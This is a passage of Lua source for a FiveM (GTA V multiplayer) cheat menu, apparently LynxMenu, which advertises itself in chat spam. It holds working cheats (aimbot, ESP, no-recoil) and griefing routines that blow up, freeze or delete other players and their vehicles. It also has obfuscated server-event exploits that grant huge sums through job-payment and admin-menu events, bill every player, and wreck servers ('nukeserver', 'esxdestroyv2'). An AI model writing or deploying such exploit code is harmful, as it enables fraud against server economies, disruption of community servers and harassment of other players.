                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) then
                        local ped = GetPlayerPed(i)
                        local coords = GetEntityCoords(ped)
                        local vehiclehash = GetHashKey('deluxo')
                        SetEntityHealth(PlayerPedId(), 0)
                        AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, false, true, 0.0)
                        RequestModel(vehiclehash)
                        CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                        SetEntityAsNoLongerNeeded(veh)
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'BRUTAN ON YOUTUBE BEST FIVEM CHEATS',
                            {0, 0x99, 255},
                            '/ooc BRUTAN ON YOUTUBE BEST FIVEM CHEATS'
                        )
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'BRUTAN ON YOUTUBE BEST FIVEM CHEATS',
                            {0, 0x99, 255},
                            'BRUTAN ON YOUTUBE BEST FIVEM CHEATS'
                        )
                    end
                end
                drawNotification('~r~Dead for protection')
            end
            if fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end
            if VehicleGun then
                local cA = 'Freight'
                local bI = GetEntityCoords(GetPlayerPed(-1), true)
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    drawNotification('~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!')
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_APPISTOL'), 999999)
                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_APPISTOL') then
                        if IsPedShooting(GetPlayerPed(-1)) then
                            while not HasModelLoaded(GetHashKey(cA)) do
                                Citizen.Wait(0)
                                RequestModel(GetHashKey(cA))
                            end
                            local veh =
                                CreateVehicle(
                                GetHashKey(cA),
                                bI.x + 5 * GetEntityForwardX(GetPlayerPed(-1)),
                                bI.y + 5 * GetEntityForwardY(GetPlayerPed(-1)),
                                bI.z + 2.0,
                                GetEntityHeading(GetPlayerPed(-1)),
                                true,
                                true
                            )
                            SetEntityAsNoLongerNeeded(veh)
                            SetVehicleForwardSpeed(veh, 150.0)
                        end
                    end
                end
            end
            if DeleteGun then
                local cB = getEntity(PlayerId(-1))
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
                    drawNotification(
                        '~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!'
                    )
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
                    if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
                        if IsPlayerFreeAiming(PlayerId(-1)) then
                            if IsEntityAPed(cB) then
                                if IsPedInAnyVehicle(cB, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(cB, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(cB, true))
                                        SetEntityAsMissionEntity(cB, 1, 1)
                                        DeleteEntity(cB)
                                        drawNotification('~g~Deleted!')
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(cB, 1, 1)
                                        DeleteEntity(cB)
                                        drawNotification('~g~Deleted!')
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(cB, 1, 1)
                                    DeleteEntity(cB)
                                    drawNotification('~g~Deleted!')
                                end
                            end
                        end
                    end
                end
            end
            if fuckallcars then
                for as in EnumerateVehicles() do
                    if not IsPedAPlayer(GetPedInVehicleSeat(as, -1)) then
                        SetVehicleHasBeenOwnedByPlayer(as, false)
                        SetEntityAsMissionEntity(as, false, false)
                        StartVehicleAlarm(as)
                        DetachVehicleWindscreen(as)
                        SmashVehicleWindow(as, 0)
                        SmashVehicleWindow(as, 1)
                        SmashVehicleWindow(as, 2)
                        SmashVehicleWindow(as, 3)
                        SetVehicleTyreBurst(as, 0, true, 1000.0)
                        SetVehicleTyreBurst(as, 1, true, 1000.0)
                        SetVehicleTyreBurst(as, 2, true, 1000.0)
                        SetVehicleTyreBurst(as, 3, true, 1000.0)
                        SetVehicleTyreBurst(as, 4, true, 1000.0)
                        SetVehicleTyreBurst(as, 5, true, 1000.0)
                        SetVehicleTyreBurst(as, 4, true, 1000.0)
                        SetVehicleTyreBurst(as, 7, true, 1000.0)
                        SetVehicleDoorBroken(as, 0, true)
                        SetVehicleDoorBroken(as, 1, true)
                        SetVehicleDoorBroken(as, 2, true)
                        SetVehicleDoorBroken(as, 3, true)
                        SetVehicleDoorBroken(as, 4, true)
                        SetVehicleDoorBroken(as, 5, true)
                        SetVehicleDoorBroken(as, 6, true)
                        SetVehicleDoorBroken(as, 7, true)
                        SetVehicleLights(as, 1)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, as, 1)
                        SetVehicleNumberPlateTextIndex(as, 5)
                        SetVehicleNumberPlateText(as, 'LynxMenu')
                        SetVehicleDirtLevel(as, 10.0)
                        SetVehicleModColor_1(as, 1)
                        SetVehicleModColor_2(as, 1)
                        SetVehicleCustomPrimaryColour(as, 255, 51, 255)
                        SetVehicleCustomSecondaryColour(as, 255, 51, 255)
                        SetVehicleBurnout(as, true)
                    end
                end
            end
            if destroyvehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleUndriveable(vehicle, true)
                        SetVehicleEngineHealth(vehicle, 0)
                    end
                end
            end
            if explodevehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        NetworkRequestControlOfEntity(vehicle)
                        NetworkExplodeVehicle(vehicle, true, true, false)
                    end
                end
            end
            if deletenearestvehicle then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                        SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
                        DeleteEntity(GetVehiclePedIsIn(vehicle, true))
                        SetEntityAsMissionEntity(vehicle, 1, 1)
                        DeleteEntity(vehicle)
                    end
                end
            end
            if freezeplayer then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end
            if freezeall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end
            if aimtest then
                if IsPlayerFreeAiming(PlayerId()) then
                    local TargetPed = getEntity(PlayerId())
                    local TargetPos = GetEntityCoords(TargetPed)
                    local Exist = DoesEntityExist(TargetPed)
                    local Dead = IsPlayerDead(TargetPed)

                    if Exist and not Dead and IsEntityAPed(TargetPed) then
                        local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                        if IsEntityVisible(TargetPed) and OnScreen then
                            if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 100000) then
                                local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                            end
                        end
                    end
                end
            end
            if esp then
                for i = 0, 128 do
                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
                        local a5 = d(1.0)
                        local cC = GetPlayerPed(i)
                        local cD, cE, cF = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                        local x, y, z = table.unpack(GetEntityCoords(cC))
                        local cG =
                            GetPlayerName(i) ..
                            '\nDist: ' .. math.round(GetDistanceBetweenCoords(cD, cE, cF, x, y, z, true), 1)
                        if IsPedInAnyVehicle(cC, true) then
                            local cH =
                                GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(cC))))
                            cG = cG .. '\nVeh: ' .. cH
                        end
                        if espinfo and esp then
                            DrawText3D(x, y, z - 1.0, cG, a5.r, a5.g, a5.b)
                        end
                        if espbox and esp then
                            LineOneBegin = GetOffsetFromEntityInWorldCoords(cC, -0.3, -0.3, -0.9)
                            LineOneEnd = GetOffsetFromEntityInWorldCoords(cC, 0.3, -0.3, -0.9)
                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(cC, 0.3, -0.3, -0.9)
                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(cC, 0.3, 0.3, -0.9)
                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(cC, 0.3, 0.3, -0.9)
                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(cC, -0.3, 0.3, -0.9)
                            LineFourBegin = GetOffsetFromEntityInWorldCoords(cC, -0.3, -0.3, -0.9)
                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(cC, -0.3, -0.3, 0.8)
                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(cC, 0.3, -0.3, 0.8)
                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(cC, 0.3, -0.3, 0.8)
                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(cC, 0.3, 0.3, 0.8)
                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(cC, 0.3, 0.3, 0.8)
                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(cC, -0.3, 0.3, 0.8)
                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(cC, -0.3, -0.3, 0.8)
                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(cC, -0.3, 0.3, 0.8)
                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(cC, -0.3, 0.3, -0.9)
                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(cC, 0.3, 0.3, 0.8)
                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(cC, 0.3, 0.3, -0.9)
                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(cC, -0.3, -0.3, 0.8)
                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(cC, -0.3, -0.3, -0.9)
                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(cC, 0.3, -0.3, 0.8)
                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(cC, 0.3, -0.3, -0.9)
                            DrawLine(
                                LineOneBegin.x,
                                LineOneBegin.y,
                                LineOneBegin.z,
                                LineOneEnd.x,
                                LineOneEnd.y,
                                LineOneEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                LineTwoBegin.x,
                                LineTwoBegin.y,
                                LineTwoBegin.z,
                                LineTwoEnd.x,
                                LineTwoEnd.y,
                                LineTwoEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                LineThreeBegin.x,
                                LineThreeBegin.y,
                                LineThreeBegin.z,
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                LineFourBegin.x,
                                LineFourBegin.y,
                                LineFourBegin.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                TLineOneBegin.x,
                                TLineOneBegin.y,
                                TLineOneBegin.z,
                                TLineOneEnd.x,
                                TLineOneEnd.y,
                                TLineOneEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                TLineTwoBegin.x,
                                TLineTwoBegin.y,
                                TLineTwoBegin.z,
                                TLineTwoEnd.x,
                                TLineTwoEnd.y,
                                TLineTwoEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                TLineThreeBegin.x,
                                TLineThreeBegin.y,
                                TLineThreeBegin.z,
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                TLineFourBegin.x,
                                TLineFourBegin.y,
                                TLineFourBegin.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                ConnectorOneBegin.x,
                                ConnectorOneBegin.y,
                                ConnectorOneBegin.z,
                                ConnectorOneEnd.x,
                                ConnectorOneEnd.y,
                                ConnectorOneEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                ConnectorTwoBegin.x,
                                ConnectorTwoBegin.y,
                                ConnectorTwoBegin.z,
                                ConnectorTwoEnd.x,
                                ConnectorTwoEnd.y,
                                ConnectorTwoEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                ConnectorThreeBegin.x,
                                ConnectorThreeBegin.y,
                                ConnectorThreeBegin.z,
                                ConnectorThreeEnd.x,
                                ConnectorThreeEnd.y,
                                ConnectorThreeEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                            DrawLine(
                                ConnectorFourBegin.x,
                                ConnectorFourBegin.y,
                                ConnectorFourBegin.z,
                                ConnectorFourEnd.x,
                                ConnectorFourEnd.y,
                                ConnectorFourEnd.z,
                                a5.r,
                                a5.g,
                                a5.b,
                                255
                            )
                        end
                        if esplines and esp then
                            DrawLine(cD, cE, cF, x, y, z, a5.r, a5.g, a5.b, 255)
                        end
                    end
                end
            end
            if norecoil then
                local cI = {
                    [453432689] = 1.0,
                    [3219281620] = 1.0,
                    [1593441988] = 1.0,
                    [584646201] = 1.0,
                    [2578377531] = 1.0,
                    [324215364] = 1.0,
                    [736523883] = 1.0,
                    [2024373456] = 1.0,
                    [4024951519] = 1.0,
                    [3220176749] = 1.0,
                    [961495388] = 1.0,
                    [2210333304] = 1.0,
                    [4208062921] = 1.0,
                    [2937143193] = 1.0,
                    [2634544996] = 1.0,
                    [2144741730] = 1.0,
                    [3686625920] = 1.0,
                    [487013001] = 1.0,
                    [1432025498] = 1.0,
                    [2017895192] = 1.0,
                    [3800352039] = 1.0,
                    [2640438543] = 1.0,
                    [911657153] = 1.0,
                    [100416529] = 1.0,
                    [205991906] = 1.0,
                    [177293209] = 1.0,
                    [856002082] = 1.0,
                    [2726580491] = 1.0,
                    [1305664598] = 1.0,
                    [2982836145] = 1.0,
                    [1752584910] = 1.0,
                    [1119849093] = 1.0,
                    [3218215474] = 1.0,
                    [1627465347] = 1.0,
                    [3231910285] = 1.0,
                    [-1768145561] = 1.0,
                    [3523564046] = 1.0,
                    [2132975508] = 1.0,
                    [-2066285827] = 1.0,
                    [137902532] = 1.0,
                    [2828843422] = 1.0,
                    [984333226] = 1.0,
                    [3342088282] = 1.0,
                    [1785463520] = 1.0,
                    [1672152130] = 0,
                    [1198879012] = 1.0,
                    [171789620] = 1.0,
                    [3696079510] = 1.0,
                    [1834241177] = 1.0,
                    [3675956304] = 1.0,
                    [3249783761] = 1.0,
                    [-879347409] = 1.0,
                    [4019527611] = 1.0,
                    [1649403952] = 1.0,
                    [317205821] = 1.0,
                    [125959754] = 1.0,
                    [3173288789] = 1.0
                }
                if IsPedShooting(PlayerPedId(-1)) and not IsPedDoingDriveby(PlayerPedId(-1)) then
                    local _, cJ = GetCurrentPedWeapon(PlayerPedId(-1))
                    _, cAmmo = GetAmmoInClip(PlayerPedId(-1), cJ)
                    if cI[cJ] and cI[cJ] ~= 0 then
                        tv = 0
                        if GetFollowPedCamViewMode() ~= 4 then
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                tv = tv + 0.0
                            until tv >= cI[cJ]
                        else
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                if cI[cJ] > 0.0 then
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                else
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                end
                            until tv >= cI[cJ]
                        end
                    end
                end
            end
            if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
            end
            if oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
                local cB = getEntity(PlayerId(-1))
                if IsEntityAPed(cB) then
                    if IsPedInAnyVehicle(cB, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(cB, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(cB, true), true, true, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(cB) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(cB, true, true, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(cB, true, true, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
            end
            if BlowDrugsUp then
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\87\101\101\100'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\67\111\107\101'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\77\101\116\104'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\79\112\105\117\109'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\87\101\101\100'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\67\111\107\101'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\77\101\116\104'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\79\112\105\117\109'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\87\101\101\100'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\67\111\107\101'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\77\101\116\104'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\79\112\105\117\109'
                        )
                        Citizen.Wait(1000)
                    end
                )
            end
            if blowall then
                for by = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        '^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',
                        {141, 211, 255},
                        '^' ..
                            by ..
                                '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109'
                    )
                end
                for i = 0, 128 do
                    Citizen.Wait(500)
                    AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                end
            end
            if crosshair then
                ShowHudComponentThisFrame(14)
            end
            if ci then
                local cK = false
                local cL = 130
                local cM = 0
                for G = 0, 128 do
                    if NetworkIsPlayerActive(G) and GetPlayerPed(G) ~= GetPlayerPed(-1) then
                        ped = GetPlayerPed(G)
                        blip = GetBlipFromEntity(ped)
                        x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(G), true))
                        distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                        if cK then
                            if NetworkIsPlayerTalking(G) then
                                local cN = d(1.0)
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(G) .. '  |  ' .. GetPlayerName(G),
                                    cN.r,
                                    cN.g,
                                    cN.b
                                )
                            else
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(G) .. '  |  ' .. GetPlayerName(G),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                        if distance < cL then
                            if not cK then
                                if NetworkIsPlayerTalking(G) then
                                    local cN = d(1.0)
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(G) .. '  |  ' .. GetPlayerName(G),
                                        cN.r,
                                        cN.g,
                                        cN.b
                                    )
                                else
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(G) .. '  |  ' .. GetPlayerName(G),
                                        255,
                                        255,
                                        255
                                    )
                                end
                            end
                        end
                    end
                end
            end
            if showCoords then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                roundx = tonumber(string.format('%.2f', x))
                roundy = tonumber(string.format('%.2f', y))
                roundz = tonumber(string.format('%.2f', z))
                bp('~r~X:~s~ ' .. roundx, 0.05, 0.00)
                bp('~r~Y:~s~ ' .. roundy, 0.11, 0.00)
                bp('~r~Z:~s~ ' .. roundz, 0.17, 0.00)
            end

            function carthieftroll()
                for i = 0, 128 do
                    local cO = GetEntityCoords(GetPlayerPed(i))
                    TriggerServerEvent('esx_carthief:alertcops', cO.x, cO.y, cO.z)
                end
            end

            function automaticmoneyesx()
                Citizen.CreateThread(
                    function()
                        local f =
                            KeyboardInput(
                            '\87\97\114\110\105\110\103\44\32\116\104\105\115\32\118\97\108\117\101\32\99\97\110\32\98\101\32\109\117\108\116\105\112\108\105\101\100\33\33\33',
                            '',
                            100
                        )
                        if f ~= '' then
                            local cP = KeyboardInput('Are you sure? y/n', '', 0)
                            if cP == 'y' then
                                drawNotification(
                                    '\126\104\126\126\103\126\84\101\115\116\105\110\103\32\97\108\108\32\126\121\126\69\83\88\32\126\103\126\115\99\114\105\112\116\115\126\115\126\46'
                                )
                                TriggerServerEvent('\101\115\120\95\99\97\114\116\104\105\101\102\58\112\97\121', f)
                                TriggerServerEvent(
                                    '\101\115\120\95\106\111\98\115\58\99\97\117\116\105\111\110',
                                    'give_back',
                                    f
                                )
                                TriggerServerEvent(
                                    '\101\115\120\95\102\117\101\108\100\101\108\105\118\101\114\121\58\112\97\121',
                                    f
                                )
                                TriggerServerEvent('\101\115\120\95\99\97\114\116\104\105\101\102\58\112\97\121', f)
                                TriggerServerEvent(
                                    '\101\115\120\95\103\111\100\105\114\116\121\106\111\98\58\112\97\121',
                                    f
                                )
                                TriggerServerEvent('\101\115\120\95\112\105\122\122\97\58\112\97\121', f)
                                TriggerServerEvent('\101\115\120\95\114\97\110\103\101\114\58\112\97\121', f)
                                TriggerServerEvent(
                                    '\101\115\120\95\103\97\114\98\97\103\101\106\111\98\58\112\97\121',
                                    f
                                )
                                TriggerServerEvent(
                                    '\101\115\120\95\116\114\117\99\107\101\114\106\111\98\58\112\97\121',
                                    f
                                )
                                TriggerServerEvent(
                                    '\65\100\109\105\110\77\101\110\117\58\103\105\118\101\66\97\110\107',
                                    f
                                )
                                TriggerServerEvent(
                                    '\65\100\109\105\110\77\101\110\117\58\103\105\118\101\67\97\115\104',
                                    f
                                )
                                TriggerServerEvent(
                                    '\101\115\120\95\103\111\112\111\115\116\97\108\106\111\98\58\112\97\121',
                                    f
                                )
                                TriggerServerEvent(
                                    '\101\115\120\95\98\97\110\107\115\101\99\117\114\105\116\121\58\112\97\121',
                                    f
                                )
                                TriggerServerEvent(
                                    '\101\115\120\95\115\108\111\116\109\97\99\104\105\110\101\58\115\118\58\50',
                                    f
                                )
                            elseif cP == 'n' then
                                drawNotification(
                                    '\126\104\126\126\114\126\79\112\101\114\97\116\105\111\110\32\99\97\110\99\101\108\108\101\100\126\115\126\46'
                                )
                            else
                                drawNotification(
                                    '\126\104\126\126\114\126\73\110\118\97\108\105\100\32\67\111\110\102\105\114\109\97\116\105\111\110\126\115\126\46'
                                )
                                drawNotification(
                                    '\126\104\126\126\114\126\79\112\101\114\97\116\105\111\110\32\99\97\110\99\101\108\108\101\100\126\115\126\46'
                                )
                            end
                        end
                    end
                )
            end

            function vrpdestroy()
                Citizen.CreateThread(
                    function()
                        for by = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',
                                {141, 211, 255},
                                '^' ..
                                    by ..
                                        '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109'
                            )
                        end
                        TriggerServerEvent(
                            '\108\115\99\117\115\116\111\109\115\58\112\97\121\71\97\114\97\103\101',
                            {costs = -99999999}
                        )
                        TriggerServerEvent(
                            '\118\114\112\95\115\108\111\116\109\97\99\104\105\110\101\58\115\101\114\118\101\114\58\50',
                            999999999
                        )
                        TriggerServerEvent('\66\97\110\99\97\58\100\101\112\111\115\105\116', 999999999)
                        TriggerServerEvent('\98\97\110\107\58\100\101\112\111\115\105\116', 999999999)
                        local cQ = GetPlayerServerId(PlayerId())
                        for i = 0, 128 do
                            TriggerEvent('bank:transfer', cQ, GetPlayerServerId(i), 99999999)
                        end
                    end
                )
            end
            if bl then
                esxdestroyv2()
                nukeserver()
            end

            function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent(
                            '\101\115\120\95\106\111\98\115\58\99\97\117\116\105\111\110',
                            'give_back',
                            9999999999
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\102\117\101\108\100\101\108\105\118\101\114\121\58\112\97\121',
                            9999999999
                        )
                        TriggerServerEvent('\101\115\120\95\99\97\114\116\104\105\101\102\58\112\97\121', 9999999999)
                        TriggerServerEvent(
                            '\101\115\120\95\103\111\100\105\114\116\121\106\111\98\58\112\97\121',
                            9999999999
                        )
                        TriggerServerEvent('\101\115\120\95\112\105\122\122\97\58\112\97\121', 9999999999)
                        TriggerServerEvent('\101\115\120\95\114\97\110\103\101\114\58\112\97\121', 9999999999)
                        TriggerServerEvent(
                            '\101\115\120\95\103\97\114\98\97\103\101\106\111\98\58\112\97\121',
                            9999999999
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\116\114\117\99\107\101\114\106\111\98\58\112\97\121',
                            9999999999
                        )
                        TriggerServerEvent(
                            '\65\100\109\105\110\77\101\110\117\58\103\105\118\101\66\97\110\107',
                            9999999999
                        )
                        TriggerServerEvent(
                            '\65\100\109\105\110\77\101\110\117\58\103\105\118\101\67\97\115\104',
                            9999999999
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\103\111\112\111\115\116\97\108\106\111\98\58\112\97\121',
                            9999999999
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\98\97\110\107\115\101\99\117\114\105\116\121\58\112\97\121',
                            9999999999
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\115\108\111\116\109\97\99\104\105\110\101\58\115\118\58\50',
                            9999999999
                        )
                        for by = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',
                                {141, 211, 255},
                                '^' ..
                                    by ..
                                        '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109'
                            )
                        end
                        for i = 0, 128 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                '\105\116\101\109\95\109\111\110\101\121',
                                '\109\111\110\101\121',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                '\105\116\101\109\95\109\111\110\101\121',
                                '\109\111\110\101\121',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                '\80\117\114\112\111\115\101\108\101\115\115',
                                '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109',
                                43161337
                            )
                            TriggerServerEvent(
                                '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                                GetPlayerServerId(i),
                                '\112\111\108\105\99\101',
                                3
                            )
                            TriggerServerEvent(
                                '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                                i,
                                '\112\111\108\105\99\101',
                                3
                            )
                        end
                    end
                )
            end

            function nukeserver()
                Citizen.CreateThread(
                    function()
                        local cR = 'Avenger'
                        local cS = 'CARGOPLANE'
                        local cT = 'luxor'
                        local cU = 'maverick'
                        local cV = 'blimp2'
                        while not HasModelLoaded(GetHashKey(cS)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(cS))
                        end
                        while not HasModelLoaded(GetHashKey(cT)) do
                            Citizen.Wait(0)
